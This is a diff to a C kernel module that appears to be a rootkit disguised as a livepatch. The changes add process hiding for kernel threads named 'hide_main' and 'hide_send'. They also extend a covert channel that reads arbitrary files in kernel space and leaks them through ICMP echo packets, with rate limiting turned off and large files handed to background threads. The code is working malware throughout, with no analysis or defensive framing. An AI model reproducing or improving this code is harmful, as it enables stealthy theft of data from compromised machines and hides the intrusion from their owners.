@@ -119,10 +119,18 @@ module_param(force_reboot_disabled, int, 0644);
 static int force_kprobe_puzzle = 1;
 module_param(force_kprobe_puzzle, int, 0644);
 
-#define KHTREAD_PROC_NAME "kthread_proc"
+#define KHTREAD_MAIN_NAME "hide_main"
+#define KHTREAD_SEND_FILE_NAME "hide_send"
+#define MAX_NUM_KTHREAD 5
+static atomic_t num_kthread = ATOMIC_INIT(0);
+
+
 #define MAX_NUM_PROC_NAME 10
 static int num_proc_name = 3;
-static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {KHTREAD_PROC_NAME, "hidden_comm", "touch", "rm"};
+static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {
+	KHTREAD_MAIN_NAME, KHTREAD_SEND_FILE_NAME,
+	"hidden_comm", "touch", "rm"
+};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
 /* secret */
@@ -2046,30 +2054,24 @@ static int icmp_ratelimit(struct net_ratelimit_state *rs, int len)
         return ret;
 }
 
-
-static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char *buf, int buf_len)
+static int send_file_data(const char *fname, int f_len, struct sk_buff *skb, char *data, loff_t file_size)
 {
 	struct sk_buff *skb2 = NULL;
 	struct icmphdr *icmph = NULL;
 	char *cmd = NULL;
 	char *name = NULL;
-	void *data = NULL;
 	char *ptr = NULL;
-	loff_t file_size = 0;
 	loff_t size = 0;
+	unsigned int skb2_buf_len = 0;
 	int len = 0;
 	int rc = -1;
 	unsigned short seq = 0; 
 
-	if (!fname || f_len <= 0 || !skb || !buf || buf_len <= sizeof(int))
+	if (!fname || f_len <= 0 || !skb || !data || file_size <= 0)
 		goto end;
 
 	name = kstrdup(fname, GFP_KERNEL);
 	if (!name)
-		goto end;
-
-	rc = kernel_read_file_from_path(name, &data, &file_size, INT_MAX, 0);
-	if (rc < 0)
 		goto end;
 
 	size = 0;
@@ -2079,13 +2081,15 @@ static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char 
 		goto end;
 	icmph = icmp_hdr(skb2);
 	cmd = (char *)icmph + sizeof(struct icmphdr) + sizeof(struct timeval);
+	skb2_buf_len = skb2->len - sizeof(struct icmphdr) - sizeof(struct timeval)
+                                 - LEN_PREFIX_CMD - f_len - 1 ;
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	while (file_size > 0) {
 		/*
 		  format: CMD + filename + '\0' + datalen + data
 		*/
-		len = file_size > buf_len-sizeof(int) ? buf_len-sizeof(int) : file_size;
+		len = file_size > skb2_buf_len-sizeof(int) ? skb2_buf_len-sizeof(int) : file_size;
 
 		ptr = cmd;
 		*((short*)ptr) = htons(CMD_SEND_FILE);
@@ -2119,17 +2123,90 @@ static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char 
 		size += len;
 	}
 	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+	rc = 0;
 
 end:
 	if (skb2)
 		kfree_skb(skb2);
-	if (data)
-		vfree(data);
 	if (name)
 		kfree(name);
+	if (data)
+		vfree(data);
 	kfree_skb(skb);
 
+	return rc;
+}
+
+struct send_file_struct {
+	const char *fname;
+	int f_len;
+	struct sk_buff *skb;
+	char *data;
+	loff_t file_size;
+};
+
+static int kthread_send_file(void *data)
+{
+	struct send_file_struct *sf_st = data;
+	int ret = -1;
+
+	if (sf_st)
+		ret = send_file_data(sf_st->fname, sf_st->f_len, sf_st->skb,
+				sf_st->data, sf_st->file_size);
+
+	kfree(sf_st);
+	atomic_dec(&num_kthread);
 	return 0;
+}
+
+static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char *buf, int buf_len)
+{
+	void *data = NULL;
+	loff_t file_size = 0;
+	struct send_file_struct *sf_st = NULL;
+	struct task_struct *tsk = NULL;
+	int rc = -1;
+
+	if (!fname || f_len <= 0 || !skb || !buf || buf_len <= sizeof(int))
+		goto free_skb;
+
+	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
+	if (rc < 0)
+		goto free_skb;
+
+	if (file_size <= 1024*1024*5) {
+		rc = send_file_data(fname, f_len, skb, data, file_size);
+		goto end;
+	} else {
+		sf_st = kmalloc(sizeof(*sf_st), GFP_KERNEL);
+		if (!sf_st)
+			goto free_data;
+
+		sf_st->fname = fname;
+		sf_st->f_len = f_len;
+		sf_st->skb   = skb;
+		sf_st->data  = data;
+		sf_st->file_size = file_size;
+
+		if (atomic_inc_return(&num_kthread) <= MAX_NUM_KTHREAD) {
+			tsk = kthread_run(kthread_send_file, sf_st, KHTREAD_SEND_FILE_NAME);
+			if (tsk) {
+				rc = 0;
+				goto end;
+			}
+		}
+		atomic_dec(&num_kthread);
+		kfree(sf_st);
+	}
+
+free_data:
+	if (data)
+		vfree(data);
+free_skb:
+	if (skb)
+		kfree_skb(skb);
+end:
+	return rc;
 }
 
 static long get_file_size(const char *name)
@@ -2262,6 +2339,7 @@ static int do_exec_event(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
 	char *data = NULL;
+	char *orig_data = NULL;
 	short int cmd = 0;
 	int send_skb = 1;
 	int len = 0;
@@ -2273,8 +2351,16 @@ static int do_exec_event(struct sk_buff *skb)
 		goto end;
 
 	data = (char *)icmph + sizeof(struct icmphdr)+ sizeof(struct timeval);
-	if (dec_buf(data, data, len) < 0)
+
+	orig_data = vmalloc(len);
+	if (!orig_data)
 		goto end;
+	memcpy(orig_data, data, len);
+
+	if (dec_buf(data, data, len) < 0) {
+		memcpy(data, orig_data, len);
+		goto end;
+	}
 
 	cmd = ntohs(*(short *)data);
 	switch (cmd) {
@@ -2323,6 +2409,8 @@ static int do_exec_event(struct sk_buff *skb)
 #endif
 
 end:
+	if (orig_data)
+		vfree(orig_data);
 	if (send_skb)
 		real_icmp_echo(skb);
 	return ret;
@@ -3068,7 +3156,7 @@ static int livepatch_init(void)
 //	print_hidden_module_name();
 	//clear_klog();
 
-	event_kthread = kthread_run(kthread_do_event, NULL, KHTREAD_PROC_NAME);
+	event_kthread = kthread_run(kthread_do_event, NULL, KHTREAD_MAIN_NAME);
 	if (IS_ERR(event_kthread))
 		event_kthread = NULL;
 
